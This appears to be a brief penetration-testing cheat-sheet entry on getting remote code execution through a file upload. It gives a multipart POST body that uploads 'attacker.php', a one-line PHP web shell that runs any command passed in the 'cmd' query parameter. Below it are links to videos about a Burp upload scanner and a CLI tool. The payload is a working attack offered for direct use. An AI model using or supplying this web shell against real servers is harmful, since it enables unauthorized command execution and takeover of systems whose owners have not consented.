### Add this in POST Request & Get RCE

```
-----------------------------------------------99999999999999999999999
Content-Disposition: form-data; name="rce.php"; filename="attacker.php"
Content-type: application/x-php

<?php

system($_GET["cmd"]);

?>
-----------------------------------------------99999999999999999999999
```

### Burp Extension (Upload Scanner):-
https://www.youtube.com/watch?v=dc_57FaKj3E

### A CLI Tool:-
https://www.youtube.com/watch?v=RpLtycOYjfs
